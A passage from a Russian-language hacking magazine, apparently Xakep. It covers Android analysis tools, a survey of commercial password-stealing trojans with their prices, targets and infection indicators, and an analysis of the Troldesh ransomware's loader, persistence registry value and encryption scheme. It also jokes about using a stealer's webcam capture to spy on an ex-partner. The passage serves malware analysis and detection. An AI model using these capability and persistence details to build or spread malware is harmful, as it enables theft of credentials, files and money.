и ввод паролей, если такое поведение предусмотрено в приложе нии. Поэто‐
му, если ты не доверяешь автору конкретного модуля, советую воздержаться
от его установки на свое устройство.
   Лучше попробуй написать свой собственный модуль, в котором ты будешь
полностью уверен.


             INFO

                     Подробнее о работе с Xposed читай в статье «Сам
                      себе моддер: как изме нить Android с помощью
                      Xposed». На десктопе в качестве альтернативы
                   можно использовать Frida, подробнее — в статье
                            «Инъекция для андроида. Внедряем код в чужие
                      приложения с помощью Frida».



MT MANAGER
Очень мощный и простой в использовании инс трумент для управления фай‐
лами.





                      MT Manager

Он предназначен для редактирова ния, кло нирования, шифрования и опти‐
мизации пользовательских и системных файлов APK пря мо на телефоне.
Фактически это файловый менеджер, который может работать с APK и его
содержимым. Его часто используют для того, чтобы взломать платные фун‐
кции приложения.
  Принцип работы это го инстру мента довольно прост: он анализи рует фай‐
лы DEX и файлы ресурсов APK, позволяет изменять их, а затем перепаковы‐
вает. MT Manager можно найти в открытом дос тупе.


             INFO

                    APK Studio — аналог приложения для персональ‐
                        ного компьюте ра.



ROOT EXPLORER
Этот инструмент довольно известен, его функции схожи с тем, что делает MT
Manager, но он боль ше ориентирован на прос мотр, изменение и другие опе‐
рации над всеми файлами, которые находятся на устройстве. Root Explorer
отлично справит ся с прос мотром базы данных или файлов XML из песочницы
приложения, поэто му обычно этот инстру мент используют тес тировщики
и аудиторы безопасности.





                После установки RE его интерфейс
                  выглядит так

Здесь отображается корневой каталог мобильного телефона. Его можно
изменить. После ты можешь изменить каталог RE по умол чанию, чтобы он
открывался сразу в удобном для тебя месте.
  В каталоге /data уста новлено программное обес печение устройства.
Этот раздел используется для уста новки приложений, сохранения файла нас‐
троек. Приложе ния, которые были установлены в память устройства, можно
найти в каталоге /data/app.





                         RE /data

sdcard — пространство карты памяти. В системе Android приложение может
быть установлено в двух местах: data или sdcard.
  Помимо этого, есть еще системные приложения, которые находятся
в каталоге /system/app. Если ты хочешь уда лить предус тановленное при‐
ложение, тебе сюда, но будь осторожен. Перед удалением приложе ния
из этого каталога убе дись, что система в нем не нуждается, иначе придется
перепрошивать аппарат.


SUPERSU
SuperSU был написан раз работчиком, известным под ником ChainFire.





                            SuperSU

По названию понятно, что это приложение необ ходимо для управления
устройством с правами суперпользователя. Если ты рутировал свой телефон,
то должен понимать, что любое приложение может захватить повышенные
права и сделать что‐то очень нехорошее. Как раз для таких ситу аций нужен
SuperSU, который позволяет контро лировать дос туп при ложе ний к root: нап‐
ример, давать привилегии на ограниченное количество времени. Помимо
этого, с его помощью можно по умолчанию отклю чить возможность получе‐
ния su некоторым приложениям.


             INFO

                     К сожалению, 4 октября 2017 года  ChainFire
                       опубликовал заявление «Выход SuperSU на пен‐
                      сию» в своем Google+. Он заявил, что больше
                      не будет участвовать в развитии SU и продаст
                       свое детище китайской коммерческой компании.



MAGISK
Magisk — это системный администра тор прав суперпользователя. Он имеет
две основные функции: управление разрешениями root и установка модулей
расширений с различными функциями.
   Когда мы говорим об администрирова нии root, многие сразу думают о Su‐
perSU. Но, как я уже говорила, автор покинул свой проект. На его замену при‐
шел Magisk.





                                Magisk

Поначалу заменить SuperSU было довольно сложно, и, несмотря на проб‐
лемы с поддержкой, мно гие все равно продолжали им пользоваться. К тому
же у Magisk до недавнего времени был очень гру бый интерфейс, что также
отпугивало потенциальных пользователей. Теперь интерфейс стал более
приятен глазу, в соот ветс твии со спецификацией Google Material Design.
   Это приложе ние было уда лено из Google Play, но его все еще можно найти
в открытом доступе.





                 Здесь мы скрываем от Root Checker,
                   что устройство рутиро вано

Самая популярная функция Magisk — скры тие root от выбранных приложений,
к примеру банковских клиентов, которые обычно не хотят работать на рутиро‐
ванном устройстве.


             INFO

                     Подробнее о Magisk — в статье «Magisk. Модифи‐
                      цируем прошивку Android с комфортом».



ROOT CHECKER
С помощью этого приложения можно про верить наличие прав root на устрой‐
стве. Выше, говоря о Magisk, я отметила, что root дол жен скрыться от Root
Checker. На скриншоте — результат этой манипуляции.





Приложение может делать запрос к SafetyNet, где содержится информация
об устройствах. Это поз воляет оценить безопас ность и совместимость сре ды
Android, в котором работают приложения.





                                 SafetyNet

SafetyNet проверяет информацию о программном и аппаратном обес‐
печении аппарата, на котором уста новлено приложение, а пос ле создает
профиль этого устрой ства. Затем ищет в своей базе подобный профиль
устройства сре ди доступных ему моделей, которые прошли тес тирование
на совместимость с Android. Помимо этого, оценивается целос тность прог‐
раммного и аппаратного обеспечения устройства, а также проверяется APK,
который выполнил запрос.


HEX EDITOR
Этот инструмент позволит пос мотреть любой файл на устройстве в шес тнад‐
цатеричном виде. Hex Editor можно использовать вместе с MT Manager
для редактирования файла APK.





                            Hex Editor

С помощью приложения можно  напрямую  редактировать содержимое
памяти. Также Hex Editor имеет функцию экспорта данных: ты можешь нап‐
рямую выводить шестнадцатеричные данные в C, Java и другие форматы
программного кода. Благодаря импорту данных непосредственно в прог‐
рамму ты избавишься от необ ходимости делать это вручную.


SHOW JAVA
Иногда нужно быстро декомпилировать приложение, которое уже установ‐
лено на устройстве, и Show Java отлично подойдет для решения этой задачи.
Эта программа позволяет декомпилировать APK и прос матривать рас‐
пакованные файлы.





                   Show Java и Java decompile


             INFO

                     На персональном компьюте ре советую восполь‐
                        зоваться JADX или javadecompilers.





                 Это мой рабочий стол, и я уверена
                   в этих инстру ментах

Эти инструменты позволяют исследователю быть более мобильным и делать
интересные вещи и без компьютера. Надеюсь, и ты узнал новые пути для ана‐
литики мобильных приложений и тебе было интересно.
  Не забывай постоянно обновлять набор сво их инстру ментов!
ВЗЛОМ

     ТРОЯНЫ
   НА ПРОДАЖУ
         ИЗУЧАЕМ ПОДПОЛЬНЫЙ РЫНОК
                 ВРЕДОНОСНОГО ПО





                                                                        ShəLMā
                                                                                      schelma@protonmail.com





Остап Бендер утверждал, что ему известно как минимум
четыреста способов сравнительно честного отъема денег
у населения. Вряд ли я ошибусь, предположив, что сов‐
ременные обитатели киберподполья давным‐давно прев‐
зошли в умениях Великого комбинатора. Правда, многие
из них балансируют в сво ей деятельности на грани откро‐
венного криминала, а некоторые даже переступили  эту
грань. Кто‐то спамит, кто‐то скамит, кто‐то пишет в свобод‐
ное от домашки время тро янов, а другие их продают в Сети.


Среди коммерческих троев отдельную нишу занимают стилеры и подобная
спайварь. Оно и неудивитель но: чужие секреты всегда были в цене. Сегодня
мы побеседуем о доступных в свободной продаже троянах‐шпионах, об их
особенностях, функциональных возможностях и методах борьбы с этим все‐
ленским злом. Приступим, пожалуй. Сестра, скальпель!


N0F1L3
Стилер со столь труднопроизносимым названием активно продавался в Сети
до тех пор, пока автором не заинтересовались суровые люди в погонах. Пер‐
вая версия троянчика была написана на .NET, вто рая, наз ванная N0F1L3v2, —
на С#. Трой специализировался на хищении паролей из браузе ров Chrome,
Opera, Yandex, Torch, Amiga, Cometa и Orbitum.





                         Так продавал ся N0F1L3

Стилер был выставлен на продажу сразу на нес коль ких форумах по весьма
скромной цене, причем в двух версиях: за 15 и 45 долларов соответс твенно.
Исходники автор сливал за 600 долларов. Первый релиз требовал для работы
.NET 2.0, таскал с собой биб лиотечку sqlite3.dll и дро пал на диск нужный файл
этой либы в соответствии с раз рядностью вин ды. Украденные пароли он сох‐
ранял в текстовый файл с HTML‐разметкой прямо на зараженной машине,
а затем заливал его на сервер.
   Вторая версия отличалась от пер вой отсутс твием зависи мостей, благода‐
ря чему теоре тически мог ла работать на чистой системе. Кроме того, она
научилась тырить инфу из Firefox, чего пер вая модификация N0F1L3 так и не
осилила. Стилер собирал из бра узеров куки, данные автозаполнения форм
и пароли, копиро вал с рабочего стола файлы с расширениями .doc, .docx, .txt
и .log. Из популярного FTP‐клиента FileZilla он угонял файлы filezilla_re‐
centservers.xml  и  filezilla_sitemanager.xml.  Также  трой  пытал ся
украсть криптокошельки BTC, BCN, DSH, ETH, LTC, XMR, ZEC, после чего рас‐
пихивал все это богатство по локальным папкам и выгружал на управляющий
сервак в виде архива.





                        Админка N0F1L3

N0F1L3 оборудован написанной на PHP админкой, в которой можно пос‐
мотреть статистику трояна и его логи. Автор не просто продавал стилер,
а еще и предлагал анонимусам другие связанные с ним коммерческие услуги:
обновления, добавление поддержки других браузеров и решение все воз‐
можных технических проблем. Неудивительно, что вскоре доброжелатели
стали активно перепродавать N0F1L3 на множестве популярных и не очень
площадок, а после того, как у автора начались проб лемы с законом, стилер
и вовсе выложили в паблик. Исходники и билды этого трояна различной сте‐
пени свежести можно отыскать на темати чес ких бордах и сегодня.


Методы обнаруже ния
Все версии N0F1L3 и его многочисленные модификации отлично палятся
антивирусами,  но, если  ты, юзернейм, принципиально не пользуешься
таковыми, выявить присутс твие стилера в системе совсем не сложно. Более
ранняя модификация троя сохраня ет укра денное в файлик %LOCALAPPDATA%\
f.txt, его наличие точно укажет тебе на факт заражения. N0F1L3v2 создает
в %TEMP% папки с говорящими именами Browsers, Wallets, Files и Directo‐
ry, в первой обыч но лежат файлы с вытащенной из браузе ров инфой —
Passwords.txt, Cookie.txt, CC.txt и Autofill.txt. Прятаться в системе
N0F1L3 не умеет, так что спалить его — дело техники.


KRATOS
Еще один «стилак‐форте» того же самого автора, названный не то в честь
титана из греческой мифоло гии, не то в честь героя игрушки God of War, что
более вероятно. Трой был практичес ки полностью перепи сан на С++, правда
значительная часть функций в его коде начинается с антиотладочной вставки
на ассемблере, проверяющей состояние поля BeingDebugged в структуре
PEB. Эта структура создается в памяти процесса при его запуске и содержит
информацию об окружении, загруженных модулях, а также прочие полез ные
данные. По сме щению byte ptr [rax+2] в этой структуре находится флаг,
позволяющий определить, что процесс трояна запущен под дебаггером,
и завершить его.





                        Сам такой

В допол нение к уже реализованным у его предшественников функциям Kratos
умеет делать скриншоты  (картинка сохраня ется в %TEMP% под именем
screenshot.bmp) и копиро вать файлы из пап ки клиента Telegram %AppData%\
Telegram  Desktop\tdata. Кроме этого, сти лер обращается  к реестру
в поисках ветви [HKCU\Software\Valve\Steam]. Обнаружив ее, по содер‐
жимому ключа SteamPath он определяет место установки клиента Steam,
а затем тырит оттуда файлы config\config.vdf, config\loginusers.vdf
и config\SteamAppData.vdf. Все украденное Kratos упаковывает в архив
и шлет на управляющий сервер POST‐зап росом.





                         Админка Kratos

Kratos использует админку, в целом аналогичную N0F1L3 (раз ве что дефол‐
тная фоновая картинка не такая няшная). Сам разработчик продавал свое
творение за 5000 рублей, но на всем извес тных площадках быстро отыс‐
кались анонимусы, готовые уступить билды за 1500 и даже чуть дешевле —
за лайк, симпу, отзыв или плюсик в репу. А пос ле деанона автора и пос‐
ледовавших за этим печальных событий сти лер появился в паблике и вовсе
бесплатно. В результате Kratos расползся по этим вашим интерне там,
как тараканы по студенческой общаге, периоди чес ки вылезая из укромных
щелей то там, то тут. Дуст ока зался неэффекти вен, такое можно выжечь толь‐
ко напалмом.


Методы обнаруже ния
Антивирусы вычисляют этого трояна на раз‐два. Опре делить присутствие
«Кратоса» в системе можно по наличию в %TEMP% тех же самых папок, что и у
N0F1L3, разве что к ним добавились директории Telegram и Steam с впол не
очевидным содержимым.


AZORULT
Так называется широко извес тный в узких кругах коммерческий стилер, обла‐
дающий впечатляющим набором функци ональных воз можнос тей. Трой умеет
красть сохраненные пароли, данные форм и кукисы из 33 различных браузе‐
ров, названия доб рой половины которых я впервые увидел в рекламном опи‐
сании этого самого стилера. В админке трояна имеется специальный кон‐
вертер, позволяющий прос матривать содержимое файлов cookies в формате
JSON.





                        Админка AZORult

AZORult может вытаскивать пароли из почтовых клиентов Outlook и Thunder‐
bird, FTP‐клиентов FileZilla и WinSCP, IM‐клиентов Pidgin и Psi/Psi+. Из Skype
он способен скопировать переписку, из Telegram — идентификаторы сес сий,
из клиента Steam — файлы ssfn и vdf. Список криптовалют, кошельки
которых в состоянии украсть AZORult, весьма вну шителен: он насчитыва‐
ет 38 наиме нований (примерно половина из которых лично мне тоже ни о чем
не говорит, лол).
  Среди возможностей стилера не только баналь ности вроде создания
скриншотов — он еще зна ет, как искать на зараженной машине файлы
по имени, размеру или мас ке с рекурсивным обходом вложенных дирек‐
торий, в состоянии собирать информацию о программном окру жении и аппа‐
ратной конфигурации (включая геоло кацию, спи сок установленных приложе‐
ний и работающих процес сов), а также скачивать и запускать с управляющего
сервера заданный файл. Трой имеет функцию автомати ческого самоуда‐
ления после отправки отчета, если она включена в админке, и способен
работать с серверами, если они используют .bit‐домен. Исполняемый файл
в несжатом виде занима ет порядка 110 Кбайт, а под упаковщиком легко сок‐
ращается до 40. Такой вот комбайн по цене 100 долларов.





                          Так продают AZORult

В минувшем октябре автор выкатил обновление трояна, позволяющее упа‐
ковывать стилер в документ Word или Excel, при попытке открыть который
происходит заражение. А в начале уже этого года фиксировались случаи рас‐
пространения стилера под видом утилиты Google Update, подписанной, что
характерно, валидным сертифика том.


Методы обнаруже ния
Под капотом у AZORult можно обна ружить много интересного. Имя управля‐
ющего сервера хранится в теле стилера в зашифрованном виде, для шиф‐
рования используется Base64 с произвольным словарем и RC4, ключ которо‐
го автор также захардкодил. Для соединения с сервером AZORult использует
сокеты, при этом отправляемые на сервак данные и получаемые ответы пок‐
сорены.  Архитектурно  стилер  состоит  из  нес кольких  функци ональных
модулей, которые включают ся согласно полученному из админки конфигу.
  Поскольку на просторах интернета широко распространены бил деры
для AZORult, да и перепаковывают его с завидной регулярностью, антивирусы
палят далеко не все его образцы. Однако у трояна есть один характерный
признак: скачанные и необходимые для работы биб лиоте ки он хранит в папке
%appdata%\1Mo\, факт создания которой можно считать одним из верных
признаков заражения.


EREDEL
Коммерческий стилер на С#, обладающий впол не стандартным набором
функций: кража кукисов и паролей из Chromium‐based браузе ров, соз дание
скриншотов, копирование файлов из папок FileZilla и Telegram, а также изоб‐
ражений, архивов и документов, которые юзер по неосмотрительнос ти забыл
на рабочем столе. Управление — из традиционной веб‐админки.





                         Админка Eredel

Из интересных особенностей Eredel стоит отметить раз ве что наличие спе‐
циального Telegram‐бота, c помощью которого можно нас троить троя. Стилер
продается на разных пло щадках по цене 2500 руб лей.


Методы обнаруже ния
Из‐за не слишком регулярной «чистки» Eredel отлично детектируется наибо‐
лее популярными антивирусами, поэтому замора чиваться с его «ручной»
поимкой не всегда рационально. Стилер соз дает в %TEMP% папку с именем,
представ ляющим собой шес тнадцатеричную последовательность (например,
0deb54d04c2140bb95d9d3f4919184aa),   в  которой   сохраняется  файл
screen.jpg со скрин шотом, а также размещаются папки с характерны ми
именами desktop и cookies. Если эти признаки заражения присутс твуют,
можно приступать к выкорчевыванию зловреда, и начать лучше все го с уда‐
ления содержимого временных директорий.


KPOT
Небольшой нерезидентный трой, размер бинарника которого в несжатом
виде составляет чуть мень ше 90 Кбайт. Написан на С/С++ с антиотладоч‐
ными вставками на ассемблере, чем определенно напоминает Kratos. Трой
умеет делать скриншоты, вору ет кукисы, пароли и сохраненные данные авто‐
запол нения форм из Chromium‐based и Mozilla‐based браузеров, из MSIE 6–
11 вытаскивает только хра нимые данные авториза ции. При этом у «Мозиллы»
с помощью TinySQL стилер парсит файлы key3.db и signons.sqlite,
добывая пароли оттуда.
   Kpot умеет воровать криптокошельки Bitcoin, Namecoin, Monero, Electrum,
Ethereum и Bytecoin, учетки из мессенджеров Psi, Psi+ и Pidgin, переписку
из Skype, файлы сессий из Telegram, голосо вого мес сенджера Discord и кли‐
ента Battle.Net, файлы ssfn, config.vdf и loginusers.vdf из Steam, а также
логины и пароли для соединения по FTP из FileZilla, WinSCP, wsFtp и Total
Commander.
  Одна из возможностей трояна — умение искать файлы по имени, размеру
и маске, причем не толь ко на локальных, но и на сетевых дис ках — правда,
в известной мне версии отдать ему такую команду из админки не представ‐
лялось возможным. Все, что нажито непосиль ным трудом, стилер упаковы‐
вает в .cab‐архив и заливает на управляющий сервер.
   Разработчик предусмотрел воз можность загрузки и запус ка с исполь‐
зованием loadpe исполняемого файла, ссылка на который указана в панели
управления. В 32‐разрядных версиях Windows бинарник запускается в кон‐
тексте процесса, из которого он был вызван, а в 64‐разрядных трой запускает
командную строку и инжектит приложение в процесс cmd.exe.
  После запуска стилер отсылает на управляющий сервер инфу о заражен‐
ном компьютере: версию операционной системы, данные об экранном раз‐
решении, количестве ядер и типе процессора, объеме оперативной памяти,
локальном вре мени и часовом поясе, а также сооб щает IP‐адрес сетевого
интерфейса. Управляют трояном с использовани ем веб‐панели.





                         Админка Kpot

Цена билда стилера на тематичес ких бордах составляет 65 долларов,
при этом трой не работа ет на территории СНГ: судя по всему, автор полага‐
ет, что принцип «нет пострадавших — нет заявлений» защитит и его самого,
и пользователей этой софтины от прес ледова ния со стороны правоохраните‐
лей. Однако, как показы вает практика (хотя бы тот же случай с разработчиком
Kratos), это совершенно не работает.


Методы обнаруже ния
Во время работы трой создает в папке %TEMP% кучу фай лов с именами, сос‐
тоящими из десяти цифр, а впос ледствии уда ляет их. Выловить его вручную,
если троя не пой мал антивирус, довольно слож но, однако работу стилера
можно увидеть с помощью ана лизатора тра фика по обще нию с управляющим
сервером. В одном из наиболее распространенных семплов C&C рас‐
полагался по адресу seeyouonlineservice.com.


ARKEI
Arkei — это один из самых распространенных на рынке коммерческих сти‐
леров. Исполняемый файл занимает всего лишь 96 Кбайт, при этом троян
реализует вполне стандартный для подоб ного софта набор функций. Среди
них — отправка на управляющий сервер сведений об аппаратном и програм‐
мном окружении, копирование файлов с рабочего стола, создание скрин‐
шота, сбор сохраненных форм, логинов‐паролей, истории и cookies из бра‐
узеров (в списке поддерживаемых версий значит ся шестнадцать штук), кража
кошельков Bitcoin и Ethereum, данных из FTP‐менеджера FileZilla, а также ска‐
чивание и запуск на зараженной машине произвольного файла, который
по команде из админки трой может прописать в автозагрузку, модифициро‐
вав реестр.





                  Объявление о про даже Arkei

Для управле ния стилером в комплекте пос тавки предусмотрена веб‐админка,
а розничная цена трояна сос тавляла 3000 руб лей. С февраля 2019 года Arkei
вроде бы перестал обновляться, однако проект, нас колько мне известно,
продолжает жить в ипостаси приватного стилера.


Методы обнаруже ния
Как и другие подоб ные трояны, Arkei копирует исполняемый файл в папку Lo‐
cal Settings\Temp текущего юзера, от имени учетки которого он запущен.
Награбленное он сох раняет в папке %PROGRAMDATA%, создав там директорию
с именем, содержащим пос ледова тельность из четырнадцати символов, а в
ней — вложенную папку \files\. Там размеща ются текстовые файлы с сох‐
раненными пароля ми, историей бра узера, кукиса ми и прочими данными.
Трой неплохо детектиру ется основным антивиру сами, многими — по упаков‐
щику.


PONY
Этот стилер не пользуется столь же высокой популярностью у малварщиков,
как его конкуренты, хотя на днях пра воохранительными органами был задер‐
жан злодей, промышлявший созданием админок в том числе и для этого тро‐
яна.
  Исходники Pony при определенном желании можно отыскать на GitHub.
Трой умеет воровать информа цию из бра узеров, созданных на базе Chromi‐
um и Mozilla, кучи FTP‐клиентов (в списке нас читывается несколько десятков)
и почтовых клиентов PocoMail, IncrediMail, The Bat!, Outlook, Mozilla Thunder‐
bird. Также он может тырить кошельки наиболее рас пространенных крип‐
товалют. В общем, стандартный набор, никаких неожиданностей.


Методы обнаруже ния
Невысокий спрос на «понь ку» обус ловлен, веро ятно, в том чис ле и тем, что
стилер доступен в паблике, а зна чит, при ватности в нем ноль целых и при мер‐
но столько же десятых.





                       Детекты Pony

Антивирусы трояна знают, ценят и любят. Однако доступность исходников
открывает перед понимающими людьми широкий простор для творчества.


PREDATOR THE THIEF
Стилер  со  столь помпезным  названием  весит  примерно 430  Кбайт,
на интернет‐базарах его можно купить за 2000 рублей. В комплект пос тавки
входит билд трояна, админка, ману ал по его нас тройке, гарантийный талон
и наушники.





             Объявление о про даже Predator The Thief

Вдобавок к стандартным функциям (создание скриншотов, похищение форм,
паролей и истории из бра узеров, сбор фай лов с рабочего стола и из FTP‐
клиентов, а также получение сес сий из Telegram) Perdator Predator уме ет сох‐
ранять снимок со встро енной веб‐камеры зараженного девайса, что бывает
очень актуально, если тебе вдруг придет в голову понаб людать за своей быв‐
шей. Данная функция, пожалуй, единственная интересная черта этой замеча‐
тельной софтины.


Методы обнаруже ния
Модификаций этого стилера в «дикой природе» гуля ет множес тво, с боль‐
шинством  из  них  прекрасно  знакомы  все  современные  антивирусы.
При запуске трой создает в папке C:\Documents and Settings\<USER>\Ap‐
plication Data\ файл с именем, состоящим из длинной шес тнадцатерич‐
ной символьной последовательности, и запус кает его с использованием
schtasks.exe. Награбленное он хранит в папке %APPDATA%\roaming\ptst\.


ВМЕСТО ПОСЛЕСЛОВИЯ
Перефразируя классика, можно ска зать, что все коммерческие стилеры
похожи друг на друга, но каждый работает по‐своему. Ассортимент таких
программ очень широк, поэто му люди, промышляющие компьютерным шпи‐
онажем, всегда смогут найти что‐то себе по вкусу. Важно лишь не забывать
о том, что разработка, рас простра нение и исполь зование малвари — это уго‐
ловное преступление, за которое действу ющим законодательством пре дус‐
мотрена суровая ответственность. Некоторые вспоминают об этом лишь тог‐
да, когда становится уже слишком поз дно.
ВЗЛОМ

  TROLDESH

           КАК НА САМОМ ДЕЛЕ РАБОТАЕТ
  НАШУМЕВШИЙ ТРОЯН‐ШИФРОВАЛЬЩИК





                                                                          Валентин Холмогоров
                                                                                              valentin@holmogorov.ru





В самом начале марта компания Group‐IB сообщи ла об оче‐
редной  мас сированной  ата ке  с  использованием  тро‐
яна‐шифровальщика  Troldesh. Энко дер  распространялся
с помощью сообщений электронной почты, отправленных
от имени  известных  на  российском  рынке  компаний.
Новость быстро подхватили многочисленные СМИ, мы тоже
о ней писали. Одна ко подробностей было мало. Что же
представляет собой  Troldesh, как он действует и какие
методы борьбы с этой напастью наибо лее эффективны?


ПОЧТОВАЯ РАССЫЛКА
Театр, как известно, начина ется с длительного поиска свободной парковки,
а распространение большинства вредонос ных программ — с почтовой рас‐
сылки. Среди фейковых  отправителей подобных писем иссле дователи
из Group‐IB отмечали «Всерос сийский банк развития регионов» и «Группу
компаний ПИК», а журналис ты РБК попол нили спи сок пострадавших брендов
«Ашаном», «Магнитом» и «Славнефтью», упо мянув при этом, что злоумыш‐
ленники прикрывались именами более пятидесяти фирм, названия которых
у всех на слуху. Лич но мне попада лись аналогичные письма, в строке From
которых значился автомобильный дилер «Рольф», «Бинбанк», «KIA Motors»,
«Ресо Гарантия» и некая контора «Инженер Строй».
  Очевидно, такая стра тегия продиктована общеизвестными постулатами
социальной инженерии: у сооб щения от известного отправителя больше
шансов быть открытым, чем у пос лания, автор которо го адресату совершенно
незнаком.
  О чем не рассказано в вышеупомянутых заметках, так это о том, что ссыл‐
ка, якобы ведущая на официальный сервер компании‐отправителя, на самом
деле направляет потенциальную жертву совершенно в другое место. Во всех
без исклю чения изученных мной письмах это были взломанные сайты,
работающие под управлением WordPress или Joomla.





             Письма, рас сылавшиеся в ходе ата ки Troldesh

И скрипт‐загрузчик, и собственно энкодер злодеи хранили в открытых
на запись папках <site>/content/icons/, <site>/templates/, <site>/wp‐
admin/css/ или <site>/wp‐content/themes/. Вероятно, чтобы раз мещать
вредоносное содержимое, они приобрели на каком‐то из хакерских форумов
базу  скомпрометированных  акка унтов  либо  воспользовались  одним
из известных эксплоитов для этих популярных CMS.
  Притом из десяти про анализированных мной фишинговых сообщений
только в двух содержалась ссылка на сайты под управлением Joomla,
а остальные восемь протрояненных площадок работали на WordPress. Есть
повод задуматься о безопасности этого движ ка, тем более опасная тен‐
денция подтверждается опубликованным недавно отчетом Sucuri, согласно
которому порядка 90% взломанных в течение 2018 года сайтов работали
именно на WordPress.
  При нажатии на линк с удален ного хос та ска чивался ZIP‐архив, внутри
которого хранился скрипт‐загрузчик, написанный на JScript. Чтобы скрипт
выпол нился,  пользователь  должен  самостоятель но  извлечь  из  архива
и попытаться открыть этот файл.


ЗАГРУЗЧИК
Загрузчик представляет собой обфусцированный и зашифрованный файл
JSE размером 5,7 Кбайт. В случае с сооб щением, отправленным якобы
от имени компании «Рольф», скрипт имел имя Группа  компаний  Рольф
подробности.jse, при этом зло деи даже не попытались подменить стандар‐
тный значок сценария, что опытного юзера должно хотя бы немного нас‐
торожить.





       Злодеи даже не попытались подменить стандартный значок

ESET  детектирует  этот  скрипт  как  JS/TrojanDownloader.Nemucod.EEG,
Dr.Web — как JS.DownLoader.4862, «Антивирус Кас перского» ловит его
эвристикой с вердиктом HEUR:Trojan‐Downloader.Script.Generic.





                   Скрипт‐загрузчик детектиру ется так

Принцип действия загрузчика в целом стандартен для подобных вредоносов:
об очень похожем сценарии «Хакер» недавно уже рассказывал в одной
из статей.
  Для выполнения кода на языке JScript в Windows используется приложение
wscript.exe, именуемое Windows Script Host. Запус тившись с помощью этого
приложения, сце нарий расшифровывает строки, в которых хранится URL сай‐
та с полезной нагрузкой, скачивает файл шифроваль щика в %TEMP% и запус‐
кает его в скрытом окне. В качестве «дембель ского аккорда» загрузчик
открывает свер нутое окошко cmd и отправляет туда команду на самоуда‐
ление.


ШИФРОВАЛЬЩИК
Исследователи из Group‐IB в своей пуб ликации сообщили, что Troldesh имеет
«творческие псевдонимы»: Shade, XTBL и Trojan.Encoder.858. ESET детектиру‐
ет его под име нем Win32/Kryptik, «Антивирус Кас перского» — как Trojan‐
Ransom.Win32.Shade.psq.
   Что нам известно об этом энко дере? Первые случаи заражения Trojan.En‐
coder.858 датируются еще 2015 годом, при этом вредонос, скорее все го,
является потомком другого шифровальщика —  Trojan.Encoder.686, рас‐
пространение которого началось на год раньше, в июле 2014‐го. 686‐я
модификация, названная его создателями CTB‐Locker, успешно продавалась
на одном из хакерских форумов. Трой активно использует возможности
OpenSSL и эллиптическую криптогра фию, а для генерации случайных данных
применяет CryptoAPI. Зашифрованные файлы получа ли расширение .ctbl.
  Файл шифровальщика, о котором идет речь в публикации Group‐IB, имеет
размер 1,05 Mбайт. Внутри хранится биб лиотека для работы с Tor. Энкодер
упакован  с  исполь зованием написанного на  .NET  кастомного  пакера,
под которым находится бинарник, сжа тый UPX. Кроме того, строки в трояне
зашифрованы с исполь зованием симметричного алгоритма AES.
  После запуска и инициализации шифроваль щик соз дает свою копию
в папке %ALLUSERSPROFILE%\application  data\windows\ под именем
csrss.exe. Затем он регистрируется в автозагрузке. Он ищет ветку реес тра


[<HKCU>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\]

и записывает в нее значение


'Client Server Runtime Subsystem' = '"%ALLUSERSPROFILE%\Application
Data\Windows\csrss.exe"'

На следующем этапе энко дер собира ет информацию об инфицированной
машине, а именно определяет версию операционной системы, серийный
номер дискового раздела, из которого запущен исполняемый файл, имя
компьютера и тип установленного на нем процессора. На основе этих данных
формируется уникальный для каждой инфицированной машины ключ. Этот
ключ сохраняется в ветви реес тра


[<HKLM|HKCU>\SOFTWARE\System32\Configuration\]

в параметре i. Туда же записывается версия вредоносной программы.
  Затем троян инициализирует Tor‐клиент и пытается соединиться с одним
из бридж‐релеев (bridge relay), адрес которо го в зашифрованном виде хра‐
нится в его  теле. По этому адресу шифроваль щик отправляет запрос
на регистрацию, содержащий его ID, а в ответ получает данные, необ‐
ходимые для шифрования файлов на зараженной машине. В том чис ле —
ключ RSA длиной 2048 бит и его MD5‐хеш для про верки.
  Файлы на всех локальных и подключенных к машине сетевых дисках шиф‐
руются с использованием алгорит ма AES (Advanced Encryption Standard)
в режиме CBC (Cipher Block Chaining), при этом для каждого файла создается
отдельный ключ при помощи генера тора псевдослу чайных чисел. Этот ключ
шифруется полученным через Tor ключом RSA и сохраняется в зашифрован‐
ном файле. Для файлов, имеющих атрибут Read Only, перед шифрованием
указанный атрибут сбра сывается. На прощание тро ян удаляет все точки вос‐
становления системы.
   Казалось бы, угроза давно известная и хорошо изученная, раз уж рас‐
пространяется она как минимум четыре года, толь ко вот есть одна загвоздка.
Trojan.Encoder.858, о котором говорят авторы пуб ликации Group‐IB, прис‐
ваивает зашифрованным файлам рас ширение .xtbl, а троян, заражающий
компьютеры в ходе рассматриваемой нами атаки, использует другое рас‐
ширение — .crypted000007.
  Вывод: иссле дователи ошиблись. Это не Trojan.Encoder.858.


ТАК ЧТО ЖЕ ЭТО?
На самом деле речь, скорее всего, идет о более свежей модификации 858‐
го, которая в номенклатуре Dr.Web носит гордое наименование Trojan.En‐
coder.10507. Правда, сам «Доктор» обычно детектирует этого трояна по упа‐
ковщику как Trojan.Packed2.41563, что, в общем‐то, непринципиально.





                     Так на VT детектируется энко дер

Эта модификация энкодера датиру ется 2017 годом и почти не отличается
от своего предшественника, но кое‐какие нововведения все же имеются.
  В теле вредоноса хранится 100 публичных ключей RSA длиной 3072 бита
каждый. Перед началом шифрования энкодер случайным образом выбирает
один из них, номер этого ключа сохраняется в текстовом файле с требова‐
ниями вымогателей. Каждый файл шифруется с отдельным ключом дли‐
ной 256 бит, его имя — другим ключом такой же длины, после чего оба сес‐
сионных ключа шифруются ранее выб ранным публичным ключом RSA,
а результат дописывается в конец зашифрованного файла. По завершении
шифрования трой создает на диске текстовые фай лы README с порядковым
номером от 1 до 10 следующего содержания.





                Такие тексто вые фай лы создает Troldesh

Затем вре донос меняет обои рабочего сто ла Windows, и жертва вирусописа‐
телей наблюдает сле дующую жизнерадос тную картину.





                Веселенькие обои рабочего стола

Все, тушите свет, сушите весла. Файлы зашифрованы. Помимо прочего,
в процессе своей работы троян пытается прочитать файлы %APPDATA%\thun‐
derbird\profiles.ini   и   %APPDATA%\mozilla\firefox\profiles.ini,
вероятно надеясь получить дос туп к паролям и настройкам почтового клиента
пользователя, что бы обеспечить свое дальнейшее распространение.


ПРОФИЛАКТИКА
Если повезет, часть зашифрованных вредоносом данных удастся спасти
с помощью утилит восста новления удален ных файлов. Что‐то может сох‐
раниться в теневых копиях Windows. Но я не устаю повторять снова и снова:
профилактика всевозможных инфекций полез на не только в медицинской
практике, но и в IT.
  Самый действенный метод борьбы с энкодера ми — своевременное
резервное копирование всех актуальных файлов, причем желательно —
